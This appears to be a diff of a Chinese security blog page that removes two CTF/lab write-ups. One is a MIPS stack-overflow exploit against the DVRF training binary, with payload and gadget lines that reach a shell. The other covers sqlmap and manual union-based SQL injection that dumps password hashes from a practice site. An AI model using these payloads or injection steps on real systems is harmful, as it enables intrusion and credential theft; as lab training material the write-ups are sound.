-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">//Simple BoF by b1ack0wl for E1550</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv[])&#123;</span><br><span class="line">char buf[200] =&quot;\0&quot;;</span><br><span class="line"></span><br><span class="line">if (argc &lt; 2)&#123;</span><br><span class="line">printf(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r\n&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf(&quot;Welcome to the first BoF exercise!\r\n\r\n&quot;);</span><br><span class="line">strcpy(buf, argv[1]);</span><br><span class="line"></span><br><span class="line">printf(&quot;You entered %s \r\n&quot;, buf);</span><br><span class="line">printf(&quot;Try Again\r\n&quot;);</span><br><span class="line"></span><br><span class="line">return 0x41; // Just so you can see what register is populated for return statements</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void dat_shell()&#123;</span><br><span class="line">printf(&quot;Congrats! I will now execute /bin/sh\r\n- b1ack0wl\r\n&quot;);</span><br><span class="line">system(&quot;/bin/sh -c&quot;);</span><br><span class="line"></span><br><span class="line">//execve(&quot;/bin/sh&quot;,&quot;-c&quot;,0);</span><br><span class="line">//execve(&quot;/bin/sh&quot;, 0, 0);</span><br><span class="line">exit(0);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>显然也是<code>strcpy</code>函数没有限制拷贝的长度</p>
-<p>运行它：
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01</span><br><span class="line">Usage: stack_bof_01 &lt;argument&gt;</span><br><span class="line">-By b1ack0wl</span><br></pre></td></tr></table></figure></p>
-<p>我们直接计算偏移地址</p>
-<p>生成长度为200的字符串</p>
-<p><img src="https://i.imgur.com/rTQh75u.png" alt="stack0">
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/home/oit [oit@ubuntu] [5:50]</span><br><span class="line">&gt; python patternOffset.py -s 0x41386741 -l 200</span><br><span class="line">[*] Create pattern string contains 200 characters ok!</span><br><span class="line">[*] No exact matches, looking for likely candidates...</span><br><span class="line">[+] Possible match at offset 204 (adjusted another-endian)</span><br><span class="line">[+] take time: 0.0042 s</span><br></pre></td></tr></table></figure></p>
-<p>那我们试一试直接填充</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# python -c &quot;print &apos;a&apos;*204+&apos;\x50\x09\x40\x00&apos;&quot; &gt; test</span><br><span class="line">root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1234  ./pwnable/Intro/stack_bof_01 &quot;`cat test `&quot;</span><br></pre></td></tr></table></figure></p>
-<p>此时已经将<code>$ra</code>寄存器的值覆盖掉了
-但是
-<img src="https://i.imgur.com/iaNBx6x.png" alt="stack1"></p>
-<p>在<code>dat_shell</code>函数中
-报错了
-所以这时候需要借助<code>gadget</code></p>
-<p><img src="https://i.imgur.com/EIr3CJx.png" alt="error2"></p>
-<p>之前参考了几篇文章，都是通过查找libc的基地址来确认<code>gadget</code>在内存中的地址的，但是我开始要gdb调试的时候并没有看到<code>libc.so.0</code>的加载，所以我一直怀疑是不是没加载，然后然后，看到原程序中是有puts和memset这些函数的，那显然是加载了的
-于是下一个断点然后调试</p>
-<p><img src="https://i.imgur.com/InVI4HI.png" alt="vmmap"></p>
-<p>终于找到了libc的加载基址</p>
-<p><img src="https://i.imgur.com/mIhckGP.png" alt="gadget"></p>
-<p>这样就好办了
-<code>python -c &quot;print 'a'*204+'\x20\x1b\x8a\x40'+'\x50\x09\x40\x00'&quot; &gt; test</code></p>
-<p>之后运行</p>
-<p>ok已经成功了！！！
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1235 ./pwnable/Intro/stack_bof_01 &quot;`cat test`&quot;</span><br><span class="line">Welcome to the first BoF exercise!</span><br><span class="line"></span><br><span class="line">You entered aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa �@P	@</span><br><span class="line">Try Again</span><br><span class="line">Congrats! I will now execute /bin/sh</span><br><span class="line">- b1ack0wl</span><br></pre></td></tr></table></figure></p>
-<p>不过为啥用<code>mipsrop</code>找不到这个gadget呢？
-很疑惑</p>
-<p>确认libc基址的方法大概有：</p>
-<ol>
-<li>vmmap</li>
-<li>cat /proc/pid/maps查看进程的内存分布</li>
-<li>在IDA中查找到函数真正加载的位置，然后计算偏移</li>
-</ol>
-<h1>参考</h1>
-<p><a href="https://www.anquanke.com/post/id/169689#h3-12" target="_blank" rel="noopener">路由器漏洞挖掘之栈溢出入门（一）</a>(感觉这篇文章中第二个程序调试的不是很正确，因为偏移计算的都不一样)
-<a href="https://www.anquanke.com/post/id/171918#h2-0" target="_blank" rel="noopener">路由器漏洞挖掘之栈溢出入门（二）</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/07/15/两道sql注入题/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="百浪多息">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="prontosil">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/15/两道sql注入题/" itemprop="url">两道sql注入题</a></h1>
-        
-
-		
-
-        <div class="post-meta">
-         
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-15T09:16:49+08:00">
-                2019-07-15
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Post modified&#58;</span>
-              
-              <time title="Post modified" itemprop="dateModified" datetime="2019-08-11T14:19:14+08:00">
-                2019-08-11
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  434
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1>基于sql的盲注</h1>
-<p>之前一直没有好好地学习过<code>sqlmap</code>的使用方法</p>
-<p>如果是针对post表单这种方式</p>
-<ol>
-<li>可以将抓到的包保存成一个文件，然后使用 <code>sqlmap.py -r &quot;post.txt&quot; -p n --dbs</code> 其中<code>-p</code>是指定参数</li>
-<li>sqlmap也可以自动搜寻表单<code>sqlmap.py -u &quot;url&quot; --forms</code></li>
-<li>指定参数</li>
-</ol>
-<p>趁机学到了一把<code>sqlmap</code>使用
-虽然这个题目是有点。。
-但是注入点的判断也是很重要的</p>
-<h2>爆后端数据库</h2>
-<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot;</code></p>
-<p><img src="https://i.imgur.com/8EdgoS3.png" alt="backdatabase"></p>
-<h2>爆数据库</h2>
-<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs</code></p>
-<p><img src="https://i.loli.net/2019/08/11/5vAtbEX6sDcnMYK.png" alt="8EdgoS3.png"></p>
-<h2>指定数据库报表爆表</h2>
-<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables</code></p>
-<p><img src="https://i.loli.net/2019/08/11/xyn5Y4EqVjtPIRG.png" alt="qNL5qbg.png"></p>
-<h2>指定数据库和表爆字段</h2>
-<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns</code></p>
-<p><img src="https://i.imgur.com/nd1VTmg.png" alt="column"></p>
-<h2>指定数据库，表，字符然后dump出数据</h2>
-<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump</code>
-![member](https://i.imgur.com/iRvoAHX.
-<img src="https://i.imgur.com/B6oLiAA.png" alt="password">
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: stormgroup</span><br><span class="line">Table: member</span><br><span class="line">[2 entries]</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| name  | password                         | status |</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0      |</span><br><span class="line">| mozhe | b7a0bebf8287c87253fb2958a390346a | 1      |</span><br><span class="line">+-------+----------------------------------+--------+</span><br></pre></td></tr></table></figure></p>
-<p>解密之后是106370
-这样就能登陆后台了
-<img src="https://i.imgur.com/6KXMijL.png" alt="houtai">
-<img src="https://i.imgur.com/yxq3qQi.png" alt="key0">
-太神奇了</p>
-<p>参考
-<a href="https://blog.csdn.net/u011781521/article/details/58594941" target="_blank" rel="noopener">sqlmap之(六)----POST登陆框注入实战</a></p>
-<h1>SQL手工注入漏洞测试(Access数据库)</h1>
-<p>这道题目就有点神奇了</p>
-<p>纯靠猜</p>
-<p><code>order by 4</code>判断有多少个字段</p>
-<p>然后 <code>new_list.asp?id=1 and exists(select * from admin)</code>判断是否存在<code>admin</code></p>
-<p><img src="https://i.imgur.com/UmyBe7l.png" alt="access0">
-接下来判断回显位置
-<code>/new_list.asp?id=1 union select 1,2,3,4 from admin</code></p>
-<p><img src="https://i.imgur.com/eyqGQZO.png" alt="access1">
-接下来猜测字段值
-<code>and exists (select id from admin)</code></p>
-<p>爆出字段值
-<code>union select 1,username,passwd,id from admin</code>
-<img src="https://i.imgur.com/H5rq91S.png" alt="access2"></p>
-<p>md5解密一下登陆就行了</p>
-<p><a href="https://blog.csdn.net/qq_39936434/article/details/94718134" target="_blank" rel="noopener">参考</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2845,7 +2789,7 @@ vsnprintf函数的用法：</p>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-count">55</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
